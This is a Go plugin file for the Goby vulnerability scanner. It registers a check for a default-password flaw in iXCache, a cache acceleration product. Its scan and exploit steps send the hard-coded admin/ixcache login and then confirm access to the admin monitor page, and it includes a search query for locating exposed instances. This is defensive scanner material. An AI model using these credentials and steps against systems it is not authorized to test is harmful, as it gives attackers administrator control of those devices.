package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "iXCache Default Password Vulnerability",
    "Description": "<p>iXCache is a network application layer cache acceleration engine software developed by Beijing Paiwang Software Co., Ltd. based on the PanaOS operating system.</p><p>Beijing Paiwang Software Co., Ltd. iXCache has a weak password vulnerability, which can be exploited by attackers to obtain sensitive information.</p>",
    "Product": "iXCache",
    "Homepage": "http://www.panabit.com",
    "DisclosureDate": "2021-04-30",
    "PostTime": "2023-08-04",
    "Author": "kangd1w2@163.com",
    "FofaQuery": "title=\"iXCache\"",
    "GobyQuery": "title=\"iXCache\"",
    "Level": "2",
    "Impact": "<p>attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"http://www.panabit.com\">http://www.panabit.com</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.  </p>",
    "References": [],
    "Is0day": false,
    "HasExp": false,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/login/userverify.cgi",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "username=admin&password=ixcache"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "/cgi-bin/monitor.cgi",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/monitor.cgi",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "/cgi-bin/Maintain/cfg_cmd",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastheader|variable|{{{scheme}}}://admin:ixcache@{{{hostinfo}}}/login/userverify.cgi"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/login/userverify.cgi",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "username=admin&password=ixcache"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "/cgi-bin/monitor.cgi",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/monitor.cgi",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "/cgi-bin/Maintain/cfg_cmd",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastheader|variable|{{{scheme}}}://admin:ixcache@{{{hostinfo}}}/login/userverify.cgi"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.2",
    "Translation": {
        "CN": {
            "Name": "iXCache 默认口令漏洞",
            "Product": "iXCache",
            "Description": "<p>iXCache 是北京派网软件有限公司基于 PanaOS 操作系统研发的网络应用层缓存加速引擎软件。&nbsp;</p><p>北京派网软件有限公司 iXCache 存默认口令漏洞，攻击者可利用&nbsp;admin/ixcache 获取敏感信息。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.panabit.com\">http://www.panabit.com</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过默认口令&nbsp;admin/ixcache 控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "iXCache Default Password Vulnerability",
            "Product": "iXCache",
            "Description": "<p>iXCache is a network application layer cache acceleration engine software developed by Beijing Paiwang Software Co., Ltd. based on the PanaOS operating system.</p><p>Beijing Paiwang Software Co., Ltd. iXCache has a weak password vulnerability, which can be exploited by attackers to obtain sensitive information.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"http://www.panabit.com\">http://www.panabit.com</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.&nbsp;&nbsp;</p>",
            "Impact": "<p>attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10241"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}